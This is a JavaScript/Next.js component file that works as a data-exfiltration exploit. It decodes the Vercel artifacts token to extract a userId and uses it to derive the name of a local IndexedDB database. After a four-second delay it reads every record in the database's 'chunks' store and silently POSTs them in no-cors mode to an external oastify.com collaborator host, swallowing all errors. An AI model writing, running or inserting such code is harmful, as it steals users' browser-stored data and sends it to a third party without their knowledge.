import nextConfig from "../next.config"
import { prjid } from "../app/page";

export const Idb = () => {
  const NEXT_PUBLIC_VERCEL_PROJECT_ID = String(process.env.NEXT_PUBLIC_VERCEL_PROJECT_ID);
  const NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF = process.env.NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF;
  const NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN = process.env.NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN;

  //pulling out and defining userID
  const lastDotIndex = NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN.lastIndexOf('.');
  
  const truncatedToken = NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN.substring(0, lastDotIndex);
  const decodedToken = Buffer.from(truncatedToken, 'base64').toString('utf-8');
  const userIdRegex = /"userId":"(.*?)"/;
  const match = decodedToken.match(userIdRegex);
  const userId = match ? match[1] : null;
  setTimeout(() => {
    function fetchAndSendData() {

        const dbName = String("rep:live_mode_1@") + String(NEXT_PUBLIC_VERCEL_PROJECT_ID) + String("@") + String(NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF) + String("-") + String(userId) + String(":4");
      
        console.log(dbName);
        const url = 'https://rqlt1694pp1b11zyns5oflv8fzlq9h17pw.oastify.com';

        // Open indexedDB
        const request = indexedDB.open(dbName);

        request.onsuccess = function(event) {
            const db = event.target.result;
            const transaction = db.transaction(['chunks'], 'readonly');
            const objectStore = transaction.objectStore('chunks');
            const chunks = [];

            // Open cursor to iterate over chunks
            objectStore.openCursor().onsuccess = function(event) {
                const cursor = event.target.result;
                if (cursor) {
                    // Push chunk to array
                    chunks.push(cursor.value);

                    // Move to next chunk
                    cursor.continue();
                } else {
                    // All chunks fetched, send them in a POST request
                    sendData(url, chunks);
                }
            };
        };

        request.onerror = function(event) {
            // Silently handle error without logging
        };
    }

    function sendData(url, data) {
        // Convert data to x-www-form-urlencoded format
        const formData = new URLSearchParams();
        formData.append('data', JSON.stringify(data));

        // Make a POST request in no-cors mode
        fetch(url, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData.toString(),
        })
        .then(response => {
            if (!response.ok) {
                // Silently handle error without logging
            }
            // Silently handle success without logging
        })
        .catch(error => {
            // Silently handle error without logging
        });
    }

    // Call the function to start fetching and sending data
    fetchAndSendData();
}, 4000);
};
